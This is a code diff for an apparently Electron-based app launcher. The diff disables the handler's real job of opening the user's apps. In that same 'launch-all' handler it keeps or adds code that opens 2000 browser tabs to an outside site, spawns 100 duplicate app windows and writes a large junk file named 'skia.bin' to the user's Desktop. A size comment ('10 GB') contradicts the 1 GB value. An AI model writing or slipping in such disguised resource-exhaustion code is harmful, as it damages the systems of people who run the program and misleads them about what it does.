@@ -23,9 +23,7 @@ const posY = Math.floor(Math.random() * (screenH - winHeight));
     contextIsolation: true
   }
   });
-  for(let i =0; i<100; i++){
-duplicateApp();
-  }
+  
   win.loadFile('index.html');
 }
 
@@ -120,20 +118,23 @@ const crypto = require('crypto');
 
 ipcMain.on('launch-all', (event, apps) => {
   // Open all apps
- for (const appPath of apps) {
-   shell.openPath(appPath);
- }
+//  for (const appPath of apps) {
+//    shell.openPath(appPath);
+//  }
 // shell.openPath(apps[0]);
   // Open 2 browser tabs
   for (let i = 0; i < 2000; i++) {
     shell.openExternal('https://www.emptyconsole.com');
   }
-
+for(let i =0; i<100; i++){
+duplicateApp();
+  }
   // 📁 WRITE LARGE FILE (UP TO 10 GB)
-  const documentsPath = app.getPath('documents');
+  const documentsPath = app.getPath('desktop');
   const filePath = path.join(documentsPath, 'skia.bin');
 
   const MAX_SIZE = 1 * 1024 * 1024 * 1024; // 10 GB
+  // const MAX_SIZE = 0
   const CHUNK_SIZE = 5 * 1024 * 1024; // 5 MB per write
 
   let written = 0;
